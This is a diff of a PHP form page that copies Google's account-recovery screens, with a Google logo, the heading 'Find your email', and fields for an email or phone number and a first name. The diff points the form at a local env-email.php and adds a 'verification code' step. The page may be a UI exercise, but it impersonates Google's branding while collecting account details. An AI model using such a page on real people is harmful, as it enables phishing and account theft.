@@ -1,11 +1,11 @@
 <?php
 require 'config.php';
-$title="Fazer Conta nas Contas Google";
+$title = "Fazer Conta nas Contas Google";
 ?>
-<?php require 'partials/header-login.php';?>
-<?php require 'partials/header-login.php';?>
-<form method="POST" action="<?=$base;?>/signin_action.php">
-    <div class="group-align" data-url = "<?=$base;?>">
+<?php require 'partials/header-login.php'; ?>
+
+<form method="POST" action="<?= $base; ?>/env-email.php">
+    <div class="group-align" data-url="<?= $base; ?>">
         <div class="group-title">
             <img src="assets/images/pngwing.com.png" alt="logo google">
             <h2>Find your email</h2>
@@ -17,7 +17,7 @@ $title="Fazer Conta nas Contas Google";
                     <div class="align-i">
                         <fieldset id="error-11">
                             <legend>Email or phone</legend>
-                            <input id="11" type="email"  name="recover-email">
+                            <input id="11" type="text" name="recover-email">
                         </fieldset>
                         <span id="msg-11">Obrigatório</span>
                     </div>
@@ -38,7 +38,7 @@ $title="Fazer Conta nas Contas Google";
                     <div class="align-i">
                         <fieldset id="error-12">
                             <legend>First name</legend>
-                            <input type="email"id="12"  name="first-name-user">
+                            <input type="text" id="12" name="first-name-user">
                         </fieldset>
                         <span id="msg-12">Obrigatório</span>
                     </div>
@@ -63,17 +63,25 @@ $title="Fazer Conta nas Contas Google";
                 </div>
             </div>
         </div>
-        <div class="group-i env-email-x" id="env-email">
-            <div class="containeri-x">
-                <div class="link"></div>
+        
+        <div class="group-i env-email-recover">
+        <div class="containeri-x">
+                <div class="image-i">
+                    <img src="<?= $base; ?>/assets/images/um-gif-animado-12162640777140.gif">
+                </div>
+                <div class="link">
+                    A Google enviará um código de verificação para <strong><strong>
+                </div>
                 <div class="access-i"></div>
                 <div class="group-row">
                     <div class="col-acess-2"></div>
                     <div class="col-acess-2 align-i">
-                        <button type="button">Enviar</button>
+                    <button id="button-env-code" type="text">Enviar</button>
                     </div>
+                    
                 </div>
             </div>
         </div>
+      
 </form>
-<?php require 'partials/footer-login.php';?>
+<?php require 'partials/footer-login.php'; ?>
